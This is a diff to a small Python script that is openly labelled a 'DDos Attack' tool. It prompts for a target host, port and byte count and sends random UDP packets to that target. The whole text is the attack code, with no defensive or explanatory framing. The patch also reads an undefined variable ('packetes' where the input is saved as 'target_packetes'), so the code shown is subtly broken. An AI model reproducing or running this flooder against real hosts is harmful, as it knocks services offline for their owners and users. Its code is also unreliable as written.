@@ -5,11 +5,12 @@ import time
 import  socket
 import random
 #host && Port
-target_host = raw_input("IP Target :")
+target_host = raw_input("HOST :")
 target_port = input("Port :")
+target_packetes = input("Bytes :")
 #packet
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(65500)
+bytes = random._urandom(packetes)
 sock.sendto(bytes, (target_host, target_port))
 os.system("clear")
 os.system("figlet DDos Attack")
